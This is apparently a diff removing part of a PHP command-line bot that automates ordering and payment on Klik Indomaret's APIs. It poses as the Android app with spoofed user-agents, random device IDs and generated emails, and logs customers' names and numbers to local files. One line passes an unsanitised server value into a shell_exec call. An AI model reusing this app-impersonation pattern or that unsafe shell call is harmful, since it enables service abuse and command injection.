-							$ceksk = curlx('https://api.klikindomaret.com/api/ShoppingCart/MyCart?id=&customerId=' . $ID . '&shoppingCartId=' . $SCID . '&regionID=' . $RegionId . '&mfp_id=' . $respid . '&StoreCode=' . $kodetoko . '&platform=ANDROID&NearestStoreLocation=&DeviceID=' . $DEVICE_ID . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-							$gettime = curlx('https://api.klikindomaret.com/api/Setting/Get?SettingKey=STORE_PREPARATION_TIME', null, $kuntul);
-							$gett = curlx('https://account-api-v2.klikindomaret.com/api/CustomerAddress/GetByCustomerId?custId=' . $ID, null, $kuntul2);
-							$addidx = json_decode($gett[1]);
-							$addid = $addidx[0]->ID;
-							$ZipCode = $addidx[0]->ZipCode;
-							$DistrictId = $addidx[0]->DistrictId;
-							$getmboh = curlx('https://api.klikindomaret.com/api/ShoppingCart/GetShippingMethod/' . $SCID . '?customerId=' . $ID . '&isVIrtual=false&regionID=' . $RegionId . '&CustomerAddressID=00000000-0000-0000-0000-000000000000&IsParcelView=false&DeviceID=' . $DEVICE_ID . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-							$ceksek = curlx('https://api.klikindomaret.com/api/ShoppingCart/MyCart?id=&customerId=' . $ID . '&shoppingCartId=' . $SCID . '&regionID=' . $RegionId . '&mfp_id=' . $respid . '&StoreCode=' . $kodetoko . '&platform=ANDROID&NearestStoreLocation=&DeviceID=' . $DEVICE_ID . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-							$poss = curlx('https://api.klikindomaret.com/api/ShoppingCart/StoreZoneSlotCalculate?mfp_id=' . $respid, '{"ShoppingCartID":"' . $SCID . '","IsDelivery":true,"CustomerAddressID":"' . $addid . '","DeviceID":"' . $DEVICE_ID . '","ShoppingcartPromoPackagesID":null}', $kuntul);
-							$cekasek = curlx('https://api.klikindomaret.com/api/ShoppingCart/MyCart?id=&customerId=' . $ID . '&shoppingCartId=' . $SCID . '&regionID=' . $RegionId . '&mfp_id=' . $respid . '&StoreCode=' . $kodetoko . '&platform=ANDROID&NearestStoreLocation=&DeviceID=' . $DEVICE_ID . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-							$poss2 = curlx('https://api.klikindomaret.com/api/ShoppingCart/StoreZoneSlotCalculate?mfp_id=' . $respid, '{"ShoppingCartID":"' . $SCID . '","IsDelivery":true,"CustomerAddressID":"' . $addid . '","DeviceID":"' . $DEVICE_ID . '","ShoppingcartPromoPackagesID":null}', $kuntul);
-							$possas = curlx('https://api.klikindomaret.com/api/ShoppingCart/StoreZoneSlotCalculate?mfp_id=' . $respid, '{"ShoppingCartID":"' . $SCID . '","IsDelivery":true,"CustomerAddressID":"' . $addid . '","DeviceID":"' . $DEVICE_ID . '","ShoppingcartPromoPackagesID":null}', $kuntul);
-							$possass = curlx('https://api.klikindomaret.com/api/ShoppingCart/StoreZoneSlotCalculate?mfp_id=' . $respid, '{"ShoppingCartID":"' . $SCID . '","IsDelivery":true,"CustomerAddressID":"' . $addid . '","DeviceID":"' . $DEVICE_ID . '","ShoppingcartPromoPackagesID":null}', $kuntul);
-							$possaa = curlx('https://api.klikindomaret.com/api/ShoppingCart/StoreZoneSlotCalculate?mfp_id=' . $respid, '{"ShoppingCartID":"' . $SCID . '","IsDelivery":true,"CustomerAddressID":"' . $addid . '","DeviceID":"' . $DEVICE_ID . '","ShoppingcartPromoPackagesID":null}', $kuntul);
-							$jsone = json_decode($possaa[1]);
-							$ax1 = "0";
-							$ax2 = "10";
-							echo @color('yellow', "TANGGAL : \n");
-							for ($ax1; $ax1 < $ax2; $ax1++) {
-								$tanggale = $jsone->ResponseObject->ListSlot[$ax1]->DateLabel;
-								$tanggalex = $jsone->ResponseObject->ListSlot[$ax1]->DateDayLabel;
-								echo @color('nevy', "[{$ax1}]");
-								echo "=> ";
-								echo @color('yellow', "{$tanggale}");
-								echo "\n";
-								if ($tanggale == "") {
-									break;
-								}
-							}
-							echo @color('yellow', "PILIH : ");
-							$tglee = trim(fgets(STDIN));
-							switch ($tglee) {
-								case '0':
-									$tgle = $jsone->ResponseObject->ListSlot[0]->DateSlot;
-									$tagalex = $jsone->ResponseObject->ListSlot[0]->DateLabel;
-									break;
-								case '1':
-									$tgle = $jsone->ResponseObject->ListSlot[1]->DateSlot;
-									$tagalex = $jsone->ResponseObject->ListSlot[1]->DateLabel;
-									break;
-								case '2':
-									$tgle = $jsone->ResponseObject->ListSlot[2]->DateSlot;
-									$tagalex = $jsone->ResponseObject->ListSlot[2]->DateLabel;
-									break;
-								case '3':
-									$tgle = $jsone->ResponseObject->ListSlot[3]->DateSlot;
-									$tagalex = $jsone->ResponseObject->ListSlot[3]->DateLabel;
-									break;
-								case '4':
-									$tgle = $jsone->ResponseObject->ListSlot[4]->DateSlot;
-									$tagalex = $jsone->ResponseObject->ListSlot[4]->DateLabel;
-									break;
-								case '5':
-									$tgle = $jsone->ResponseObject->ListSlot[5]->DateSlot;
-									$tagalex = $jsone->ResponseObject->ListSlot[5]->DateLabel;
-									break;
-							}
-							$jumuke = explode('T', $tgle);
-							$tgljmk = $jumuke[0];
-							echo @color('yellow', "{$tagalex}\n");
-							$axx1 = "0";
-							$axx2 = "14";
-							echo @color('yellow', "JAM ANTAR :\n");
-							for ($axx1; $axx1 < $axx2; $axx1++) {
-								$xs = $axx1 + 1;
-								$jame = $jsone->ResponseObject->ListSlot[$tglee]->SlotPengiriman[$axx1]->SlotLabel;
-								$pesane = $jsone->ResponseObject->ListSlot[$tglee]->SlotPengiriman[$axx1]->Message;
-								echo @color('nevy', "[{$xs}]");
-								echo "=> ";
-								echo @color('yellow', "{$jame}, ");
-								echo @color('red', "{$pesane}");
-								echo "\n";
-								if ($jame == "") {
-									break;
-								}
-							}
-							echo @color('yellow', "pilih : ");
-							$jamambil = trim(fgets(STDIN));
-							switch ($jamambil) {
-								case '1':
-									$jmbt = "07:00";
-									break;
-								case '2':
-									$jmbt = "08:00";
-									break;
-								case '3':
-									$jmbt = "09:00";
-									break;
-								case '4':
-									$jmbt = "10:00";
-									break;
-								case '5':
-									$jmbt = "11:00";
-									break;
-								case '6':
-									$jmbt = "12:00";
-									break;
-								case '7':
-									$jmbt = "13:00";
-									break;
-								case '8':
-									$jmbt = "14:00";
-									break;
-								case '9':
-									$jmbt = "15:00";
-									break;
-								case '10':
-									$jmbt = "16:00";
-									break;
-								case '11':
-									$jmbt = "17:00";
-									break;
-								case '12':
-									$jmbt = "18:00";
-									break;
-								case '13':
-									$jmbt = "19:00";
-									break;
-								case '14':
-									$jmbt = "20:00";
-									break;
-							}
-							$cekasek = curlx('https://api.klikindomaret.com/api/ShoppingCart/MyCart?id=&customerId=' . $ID . '&shoppingCartId=' . $SCID . '&regionID=' . $RegionId . '&mfp_id=' . $respid . '&StoreCode=' . $kodetoko . '&platform=ANDROID&NearestStoreLocation=&DeviceID=' . $DEVICE_ID . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-							if (strpos($possaa[1], '"IsSuccess":true')) {
-								$gass = curlx('https://api.klikindomaret.com/api/Cart/UpdateShippingMetohod?mfp_id=' . $respid, '{"AddressType":1,"AddressIDStore":"' . $addid . '","IStoreShippingDate":"' . $tgljmk . 'T00:00:00","IStorePreferTimeDelivery":"' . $jmbt . '","IStorePreferTimeShipping":"' . $jmbt . '","IPPServiceType":"","IsIPP":false,"AddressIDPlaza":"' . $addid . '","IPlazaShippingDate":"","IPPStoreCode":"","ShoppingCartID":"' . $SCID . '","IsDelivery":1,"RegionID":"' . $RegionId . '","IStoreDeliveryType":"REGULER","IStoreExpressOfflineLimit":0,"IStoreExpressDeliveryServiceFee":0,"MobileIstore":1,"MobileIPlaza":0,"PlazaDeliveryType":"","ShoppingcartPromoPackagesID":null,"DistrictId":' . $DistrictId . ',"ShopZipCode":"' . $ZipCode . '"}', $kuntul);
-								if (strpos($gass[1], '"Message":"success"')) {
-									$createpay = curlx('https://api.klikindomaret.com/api/Payment/CreateId?Id=' . $SCID, null, $kuntul);
-									$headers1 = array();
-									$headers1[] = 'Host: payment.klikindomaret.com';
-									$headers1[] = 'user-agent: klikindomaretmobile';
-									$headers1[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8';
-									for ($i = 0; $i < 3; $i++) {
-										$getpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments?pcid=klikindomaret&trxtype=createorder&SCTPCID=' . $SCID . '&LAT=null&LONG=null&DeviceID=' . urut(16), null, $headers1);
-										$linkx = get_between($getpay[1], '"hdTotalAmount" value="', '"');
-										echo @color('nevy', "TOTAL : {$linkx}\n");
-									}
-									echo @color('yellow', "DAFTAR HIDANGAN :\n");
-									echo @color('yellow', "[1] Isaku\n");
-									echo @color('yellow', "[2] BCA\n");
-									echo @color('yellow', "[3] REKPON\n");
-									echo @color('yellow', "[3] REKPON\n");
-									echo @color('yellow', "pilih : ");
-									$bayar = trim(fgets(STDIN));
-									switch ($bayar) {
-										case '1':
-											echo "Total : {$linkx}\n";
-											$parcel1 = array();
-											$parcel1[] = 'Host: payment.klikindomaret.com';
-											$parcel1[] = 'Accept: */*';
-											$parcel1[] = 'Origin: https://payment.klikindomaret.com';
-											$parcel1[] = 'user-agent: klikindomaretmobile';
-											$parcel1[] = 'content-type: application/json; charset=UTF-8';
-											$parcel1[] = 'x-requested-with: XMLHttpRequest';
-											$padrcel1[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
-											$submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"BPISAKU","TotalAmount":"' . $linkx . '","Token":"","IsCoupon":"0","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"PaymentTypeName":"i.Saku","useCoin":false,"potentialCoinShopee":"","Source":"Android"}', $parcel1);
-											$k = json_decode($submitpay[1])->Trxid;
-											$lk = str_replace('TIM', '', $k);
-											unlink('nganue.txt');
-											echo shell_exec("xdg-open 'https://barcode.tec-it.com/barcode.ashx?data='{$lk}'&code=Code128&multiplebarcodes=false&translate-esc=true&unit=Fit&dpi=96&imagetype=Gif&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=Default&qunit=Mm&quiet=10&hidehrt=False'");
-											$sttpay = curlx('https://api.klikindomaret.com/api/SalesOrder/GetSalesOrderHeaderListByCustomerIdAndSalesOrderNo/null?sortmode=&id=' . $ID . '&currPage=1&pageSize=30&no=&mode=0', null, $kuntul);
-											sleep(5);
-											$sttp = json_decode($sttpay[1]);
-											$stbyr = $sttp[0]->StatusPembayaran;
-											$sttype = $sttp[0]->PaymentTypeName;
-											$sttexp = $sttp[0]->PaymentExpiredDate;
-											$TransactionCode = $sttp[0]->TransactionCode;
-											$jenenge = $sttp[0]->CustomerContactName;
-											$totale = $sttp[0]->Total;
-											$PaymentAccountID = $sttp[0]->PaymentAccountID;
-											if ($stbyr == null) {
-												$sttbayar = 'Segera cek';
-											} else {
-												$sttbayar = $stbyr;
-											}
-											echo @color('yellow', "Kode Transaksi: ");
-											echo @color('nevy', "{$TransactionCode}\n");
-											echo @color('yellow', "Status Pembayaran: ");
-											echo @color('nevy', "{$sttbayar}\n");
-											echo @color('yellow', "Tipe Pembayaran: ");
-											echo @color('nevy', "{$sttype}\n");
-											echo @color('yellow', "PaymentExpiredDate: ");
-											echo @color('nevy', "{$sttexp}\n");
-											save("KodeTransaksi: " . $TransactionCode . "|Nama: " . $jenenge . "|Nomor: " . $nomor . "|KodeToko: " . $tokonejon . "|Total: " . $totale . "\n", 'transaksiIsaku.txt');
-											break;
-										case '2':
-											$parcel1 = array();
-											$parcel1[] = 'Host: payment.klikindomaret.com';
-											$parcel1[] = 'Accept: */*';
-											$parcel1[] = 'Origin: https://payment.klikindomaret.com';
-											$parcel1[] = 'user-agent: klikindomaretmobile';
-											$parcel1[] = 'content-type: application/json; charset=UTF-8';
-											$parcel1[] = 'x-requested-with: XMLHttpRequest';
-											$padrcel1[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
-											$submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"702","TotalAmount":"' . $linkx . '","Token":"","IsCoupon":"1","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"Source":"Android"}', $parcel1);
-											$sttpay = curlx('https://api.klikindomaret.com/api/SalesOrder/GetSalesOrderHeaderListByCustomerIdAndSalesOrderNo/null?sortmode=&id=' . $ID . '&currPage=1&pageSize=30&no=&mode=0', null, $kuntul);
-											$sttp = json_decode($sttpay[1]);
-											$stbyr = $sttp[0]->StatusPembayaran;
-											$sttype = $sttp[0]->PaymentTypeName;
-											$sttexp = $sttp[0]->PaymentExpiredDate;
-											$TransactionCode = $sttp[0]->TransactionCode;
-											$jenenge = $sttp[0]->CustomerContactName;
-											$totale = $sttp[0]->Total;
-											$PaymentAccountID = $sttp[0]->PaymentAccountID;
-											   $dircrot = $sttp[0]->Referer;
-											if ($stbyr == null) {
-												$sttbayar = 'Segera cek';
-											} else {
-												$sttbayar = $stbyr;
-											}
-										
-									echo " {$Yellow}➤{$White} Payment Redirect	 : " . $dircrot . "\n";
-											echo @color('yellow', "Kode Transaksi: ");
-											echo @color('nevy', "{$TransactionCode}\n");
-											echo @color('yellow', "Status Pembayaran: ");
-											echo @color('nevy', "{$sttbayar}\n");
-											echo @color('yellow', "Tipe Pembayaran: ");
-											echo @color('nevy', "{$sttype}\n");
-											echo @color('yellow', "KODE VA: ");
-											echo @color('nevy', "{$PaymentAccountID}\n");
-											echo @color('yellow', "PaymentExpiredDate: ");
-											echo @color('nevy', "{$sttexp}\n");
-											save("KodeTransaksi: " . $TransactionCode . "|Nama: " . $jenenge . "|Nomor: " . $nomor . "|KodeToko: " . $tokonejon . "|Total: " . $totale . "|Kode VA :" . $PaymentAccountID . "\n", 'transaksiBCA.txt');
-											unlink('nganue.txt');
-											break;
-										case '3':
-											echo @color('yellow', "Masukkan token: ");
-											$tokentt = trim(fgets(STDIN));
-											$parcel1 = array();
-											$parcel1[] = 'Host: payment.klikindomaret.com';
-											$parcel1[] = 'Accept: */*';
-											$parcel1[] = 'Origin: https://payment.klikindomaret.com';
-											$parcel1[] = 'user-agent: klikindomaretmobile';
-											$parcel1[] = 'content-type: application/json; charset=UTF-8';
-											$parcel1[] = 'x-requested-with: XMLHttpRequest';
-											$padrcel1[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
-											$submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"RKPON","TotalAmount":"' . $linkx . '","Token":"' . $tokentt . '","IsCoupon":"0","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"PaymentTypeName":"CIMB Niaga Rekening Ponsel","useCoin":false,"potentialCoinShopee":"","Source":"Android"}', $parcel1);
-											$sttpay = curlx('https://api.klikindomaret.com/api/SalesOrder/GetSalesOrderHeaderListByCustomerIdAndSalesOrderNo/null?sortmode=&id=' . $ID . '&currPage=1&pageSize=30&no=&mode=0', null, $kuntul);
-											$sttp = json_decode($sttpay[1]);
-											$stbyr = $sttp[0]->StatusPembayaran;
-											$sttype = $sttp[0]->PaymentTypeName;
-											$sttexp = $sttp[0]->PaymentExpiredDate;
-											$TransactionCode = $sttp[0]->TransactionCode;
-											$jenenge = $sttp[0]->CustomerContactName;
-											$totale = $sttp[0]->Total;
-											$PaymentAccountID = $sttp[0]->PaymentAccountID;
-											   $dircrot = $sttp[0]->Referer;
-											if ($stbyr == null) {
-												$sttbayar = 'Segera cek';
-											} else {
-												$sttbayar = $stbyr;
-											}
-										
-									echo " {$Yellow}➤{$White} Payment Redirect	 : " . $dircrot . "\n";
-											echo @color('yellow', "Kode Transaksi: ");
-											echo @color('nevy', "{$TransactionCode}\n");
-											echo @color('yellow', "Status Pembayaran: ");
-											echo @color('nevy', "{$sttbayar}\n");
-											echo @color('yellow', "Tipe Pembayaran: ");
-											echo @color('nevy', "{$sttype}\n");
-											echo @color('yellow', "PaymentExpiredDate: ");
-											echo @color('nevy', "{$sttexp}\n");
-											save("KodeTransaksi: " . $TransactionCode . "|Nama: " . $jenenge . "|Nomor: " . $nomor . "|KodeToko: " . $tokonejon . "|Total: " . $totale . "|Kode VA :" . $PaymentAccountID . "\n", 'transaksiREKPON.txt');
-											unlink('nganue.txt');
-											break;
-									}
-								} else {
-									echo @color('red', "{$gass[1]}\n");
-								}
-							} else {
-								echo @color('red', "{$possaa[1]}\n");
-							}
-							break;
-						case '2':
-							$gett = curlx('https://account-api-v2.klikindomaret.com/api/CustomerAddress/GetByCustomerId?custId=' . $ID, null, $kuntul2);
-							if ($gett[1] == '[]') {
-								$addid = '00000000-0000-0000-0000-000000000000';
-							} else {
-								$addidx = json_decode($gett[1]);
-								$addid = $addidx[0]->ID;
-							}
-							$poss = curlx('https://api.klikindomaret.com/api/ShoppingCart/StoreZoneSlotCalculate?mfp_id=' . $respid, '{"ShoppingCartID":"' . $SCID . '","IsDelivery":false,"StoreID":"' . $storeid . '","DeviceID":"' . $DEVICE_ID . '","ShoppingcartPromoPackagesID":null}', $kuntul);
-							switch ($jamambil) {
-								case '1':
-									$jmbt = "07:00";
-									break;
-								case '2':
-									$jmbt = "08:00";
-									break;
-								case '3':
-									$jmbt = "09:00";
-									break;
-								case '4':
-									$jmbt = "10:00";
-									break;
-								case '5':
-									$jmbt = "11:00";
-									break;
-								case '6':
-									$jmbt = "12:00";
-									break;
-								case '7':
-									$jmbt = "13:00";
-									break;
-								case '8':
-									$jmbt = "14:00";
-									break;
-								case '9':
-									$jmbt = "15:00";
-									break;
-								case '10':
-									$jmbt = "16:00";
-									break;
-								case '11':
-									$jmbt = "17:00";
-									break;
-								case '12':
-									$jmbt = "18:00";
-									break;
-								case '13':
-									$jmbt = "19:00";
-									break;
-								case '14':
-									$jmbt = "20:00";
-									break;
-							}
-							if (strpos($poss[1], '"IsSuccess":true')) {
-								$gass = curlx('https://api.klikindomaret.com/api/Cart/UpdateShippingMetohod?mfp_id=' . $respid, '{"AddressType":0,"AddressIDStore":"' . $addid . '","IStoreShippingDate":"' . date("Y") . '-' . $blne . '-' . $tgle . 'T00:00:00","IStorePreferTimeDelivery":"' . $jmbt . '","IStorePreferTimeShipping":"' . $jmbt . '","IPPServiceType":"","IsIPP":false,"AddressIDPlaza":"' . $addid . '","IPlazaShippingDate":"","IPPStoreCode":"","ShoppingCartID":"' . $SCID . '","IsDelivery":0,"RegionID":"' . $RegionID . '","IStoreDeliveryType":"REGULER","IStoreExpressOfflineLimit":0,"IStoreExpressDeliveryServiceFee":0,"MobileIstore":1,"MobileIPlaza":0,"PlazaDeliveryType":"","ShoppingcartPromoPackagesID":null,"DistrictId":' . $DistrictID . ',"StoreID":"' . $storeid . '","ShopZipCode":"' . $ZipCode . '"}', $kuntul);
-								if (strpos($gass[1], '"Message":"success"')) {
-									$createpay = curlx('https://api.klikindomaret.com/api/Payment/CreateId?Id=' . $SCID, null, $kuntul);
-									$headers1 = array();
-									$headers1[] = 'Host: payment.klikindomaret.com';
-									$headers1[] = 'user-agent: klikindomaretmobile';
-									$headers1[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8';
-									for ($i = 0; $i < 3; $i++) {
-										$getpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments?pcid=klikindomaret&trxtype=createorder&SCTPCID=' . $SCID . '&LAT=null&LONG=null&DeviceID=' . urut(16), null, $headers1);
-										$linkx = get_between($getpay[1], '"hdTotalAmount" value="', '"');
-										echo @color('nevy', "TOTAL : {$linkx}\n");
-									}
-									switch ($bayar) {
-										case '1':
-											echo "Total : {$linkx}\n";
-											$parcel1 = array();
-											$parcel1[] = 'Host: payment.klikindomaret.com';
-											$parcel1[] = 'Accept: */*';
-											$parcel1[] = 'Origin: https://payment.klikindomaret.com';
-											$parcel1[] = 'user-agent: klikindomaretmobile';
-											$parcel1[] = 'content-type: application/json; charset=UTF-8';
-											$parcel1[] = 'x-requested-with: XMLHttpRequest';
-											$padrcel1[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
-											// $submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"BPISAKU","TotalAmount":"'.$linkx.'","Token":"","IsCoupon":"0","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"PaymentTypeName":"i.Saku","useCoin":false,"potentialCoinShopee":"","Source":"Android"}', $parcel1);
-											$submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"BPISAKU","TotalAmount":"' . $linkx . '","Token":"","IsCoupon":"0","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"PaymentTypeName":"i.saku","IsFlashSale":"False","emailCustomer":"' . $nomor . '@klikindomaret.com","useCoin":false,"usePoint":false,"partialPointOVO":"0","potentialCoinShopee":"","Source":"MobileSite-Android","Client":"klikindomaret"}', $parcel1);
-											$k = json_decode($submitpay[1])->Trxid;
-											$lk = str_replace('TIM', '', $k);
-											unlink('nganue.txt');
-											echo shell_exec("xdg-open 'https://barcode.tec-it.com/barcode.ashx?data='{$lk}'&code=Code128&multiplebarcodes=false&translate-esc=true&unit=Fit&dpi=96&imagetype=Gif&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=Default&qunit=Mm&quiet=10&hidehrt=False'");
-											$sttpay = curlx('https://api.klikindomaret.com/api/SalesOrder/GetSalesOrderHeaderListByCustomerIdAndSalesOrderNo/null?sortmode=&id=' . $ID . '&currPage=1&pageSize=30&no=&mode=0', null, $kuntul);
-											sleep(5);
-											$sttp = json_decode($sttpay[1]);
-											$stbyr = $sttp[0]->StatusPembayaran;
-											$sttype = $sttp[0]->PaymentTypeName;
-											$sttexp = $sttp[0]->PaymentExpiredDate;
-											$TransactionCode = $sttp[0]->TransactionCode;
-											$jenenge = $sttp[0]->CustomerContactName;
-											$totale = $sttp[0]->Total;
-											$PaymentAccountID = $sttp[0]->PaymentAccountID;
-											if ($stbyr == null) {
-												$sttbayar = 'Segera cek';
-											} else {
-												$sttbayar = $stbyr;
-											}
-											echo @color('yellow', "Kode Transaksi: ");
-											echo @color('nevy', "{$TransactionCode}\n");
-											echo @color('yellow', "Status Pembayaran: ");
-											echo @color('nevy', "{$sttbayar}\n");
-											echo @color('yellow', "Tipe Pembayaran: ");
-											echo @color('nevy', "{$sttype}\n");
-											echo @color('yellow', "PaymentExpiredDate: ");
-											echo @color('nevy', "{$sttexp}\n");
-											save("KodeTransaksi: " . $TransactionCode . "|Nama: " . $jenenge . "|Nomor: " . $nomor . "|KodeToko: " . $tokonejon . "|Total: " . $totale . "\n", 'transaksiIsaku.txt');
-											break;
-										case '2':
-											$parcel1 = array();
-											$parcel1[] = 'Host: payment.klikindomaret.com';
-											$parcel1[] = 'Accept: */*';
-											$parcel1[] = 'Origin: https://payment.klikindomaret.com';
-											$parcel1[] = 'user-agent: klikindomaretmobile';
-											$parcel1[] = 'content-type: application/json; charset=UTF-8';
-											$parcel1[] = 'x-requested-with: XMLHttpRequest';
-											$padrcel1[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
-											// $submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"702","TotalAmount":"'.$linkx.'","Token":"","IsCoupon":"1","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"Source":"Android"}', $parcel1);
-											$submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"702","TotalAmount":"' . $linkx . '","Token":"","IsCoupon":"0","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"PaymentTypeName":"BCA Virtual Account","IsFlashSale":"False","emailCustomer":"' . $nomor . '@klikindomaret.com","useCoin":false,"usePoint":false,"partialPointOVO":"0","potentialCoinShopee":"","Source":"MobileSite-Android","Client":"klikindomaret"}', $parcel1);
-											$sttpay = curlx('https://api.klikindomaret.com/api/SalesOrder/GetSalesOrderHeaderListByCustomerIdAndSalesOrderNo/null?sortmode=&id=' . $ID . '&currPage=1&pageSize=30&no=&mode=0', null, $kuntul);
-											$sttp = json_decode($sttpay[1]);
-											$stbyr = $sttp[0]->StatusPembayaran;
-											$sttype = $sttp[0]->PaymentTypeName;
-											$sttexp = $sttp[0]->PaymentExpiredDate;
-											$TransactionCode = $sttp[0]->TransactionCode;
-											$jenenge = $sttp[0]->CustomerContactName;
-											$totale = $sttp[0]->Total;
-											$PaymentAccountID = $sttp[0]->PaymentAccountID;
-											   $dircrot = $sttp[0]->Referer;
-											if ($stbyr == null) {
-												$sttbayar = 'Segera cek';
-											} else {
-												$sttbayar = $stbyr;
-											}
-										
-									echo " {$Yellow}➤{$White} Payment Redirect	 : " . $dircrot . "\n";
-											echo @color('yellow', "Kode Transaksi: ");
-											echo @color('nevy', "{$TransactionCode}\n");
-											echo @color('yellow', "Status Pembayaran: ");
-											echo @color('nevy', "{$sttbayar}\n");
-											echo @color('yellow', "Tipe Pembayaran: ");
-											echo @color('nevy', "{$sttype}\n");
-											echo @color('yellow', "KODE VA: ");
-											echo @color('nevy', "{$PaymentAccountID}\n");
-											echo @color('yellow', "PaymentExpiredDate: ");
-											echo @color('nevy', "{$sttexp}\n");
-											save("KodeTransaksi: " . $TransactionCode . "|Nama: " . $jenenge . "|Nomor: " . $nomor . "|KodeToko: " . $tokonejon . "|Total: " . $totale . "|Kode VA :" . $PaymentAccountID . "\n", 'transaksiBCA.txt');
-											unlink('nganue.txt');
-											break;
-										case '3':
-											echo @color('yellow', "Masukkan token: ");
-											$tokentt = trim(fgets(STDIN));
-											$parcel1 = array();
-											$parcel1[] = 'Host: payment.klikindomaret.com';
-											$parcel1[] = 'Accept: */*';
-											$parcel1[] = 'Origin: https://payment.klikindomaret.com';
-											$parcel1[] = 'user-agent: klikindomaretmobile';
-											$parcel1[] = 'content-type: application/json; charset=UTF-8';
-											$parcel1[] = 'x-requested-with: XMLHttpRequest';
-											$padrcel1[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
-											$submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"RKPON","TotalAmount":"' . $linkx . '","Token":"' . $tokentt . '","IsCoupon":"0","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"PaymentTypeName":"CIMB Niaga Rekening Ponsel","useCoin":false,"potentialCoinShopee":"","Source":"Android"}', $parcel1);
-											$sttpay = curlx('https://api.klikindomaret.com/api/SalesOrder/GetSalesOrderHeaderListByCustomerIdAndSalesOrderNo/null?sortmode=&id=' . $ID . '&currPage=1&pageSize=30&no=&mode=0', null, $kuntul);
-											$sttp = json_decode($sttpay[1]);
-											$stbyr = $sttp[0]->StatusPembayaran;
-											$sttype = $sttp[0]->PaymentTypeName;
-											$sttexp = $sttp[0]->PaymentExpiredDate;
-											$TransactionCode = $sttp[0]->TransactionCode;
-											$jenenge = $sttp[0]->CustomerContactName;
-											$totale = $sttp[0]->Total;
-											$PaymentAccountID = $sttp[0]->PaymentAccountID;
-											   $dircrot = $sttp[0]->Referer;
-											if ($stbyr == null) {
-												$sttbayar = 'Segera cek';
-											} else {
-												$sttbayar = $stbyr;
-											}
-										
-									echo " {$Yellow}➤{$White} Payment Redirect	 : " . $dircrot . "\n";
-											echo @color('yellow', "Kode Transaksi: ");
-											echo @color('nevy', "{$TransactionCode}\n");
-											echo @color('yellow', "Status Pembayaran: ");
-											echo @color('nevy', "{$sttbayar}\n");
-											echo @color('yellow', "Tipe Pembayaran: ");
-											echo @color('nevy', "{$sttype}\n");
-											echo @color('yellow', "KODE VA: ");
-											echo @color('nevy', "{$PaymentAccountID}\n");
-											echo @color('yellow', "PaymentExpiredDate: ");
-											echo @color('nevy', "{$sttexp}\n");
-											save("KodeTransaksi: " . $TransactionCode . "|Nama: " . $jenenge . "|Nomor: " . $nomor . "|KodeToko: " . $tokonejon . "|Total: " . $totale . "|Kode VA :" . $PaymentAccountID . "\n", 'transaksiREKPON.txt');
-											unlink('nganue.txt');
-											break;
-										case '4':
-											echo "Total : {$linkx}\n";
-											$parcel1 = array();
-											$parcel1[] = 'Host: payment.klikindomaret.com';
-											$parcel1[] = 'Accept: */*';
-											$parcel1[] = 'Origin: https://payment.klikindomaret.com';
-											$parcel1[] = 'user-agent: klikindomaretmobile';
-											$parcel1[] = 'content-type: application/json; charset=UTF-8';
-											$parcel1[] = 'x-requested-with: XMLHttpRequest';
-											$padrcel1[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
-											//  $submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"BPISAKU","TotalAmount":"'.$linkx.'","Token":"","IsCoupon":"0","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"PaymentTypeName":"i.Saku","useCoin":false,"potentialCoinShopee":"","Source":"Android"}', $parcel1);
